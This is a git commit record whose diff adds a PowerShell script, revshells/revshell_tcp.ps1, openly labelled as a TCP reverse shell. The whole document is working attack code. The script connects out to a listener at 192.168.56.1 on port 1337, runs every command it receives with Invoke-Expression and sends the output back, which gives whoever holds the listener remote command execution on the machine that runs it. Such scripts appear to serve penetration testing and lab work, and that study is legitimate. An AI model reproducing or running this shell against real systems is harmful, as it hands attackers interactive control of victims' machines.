f622e79088af94ec2f6988a256265a491a0bbd6c
Olivier Lasne <lasneolivier@gmail.com>
2025-05-28 00:11:14 +0200

    added a TCP revshell

---
+++ revshells/revshell_tcp.ps1
@@ -0,0 +1,20 @@
+$LHOST = '192.168.56.1';
+$LPORT = 1337;
+$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
+$NetworkStream = $TCPClient.GetStream();
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
+$StreamWriter.AutoFlush = $true;
+$Buffer = New-Object System.Byte[] 1024;
+
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+
+    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead -1)
+    
+    if ($Code.Length -gt 1) {
+        $Output = try {
+            Invoke-Expression ($Code) 2>&1
+        } catch { $_ };
+
+        $StreamWriter.Write("$Output`n");
+    }
+};
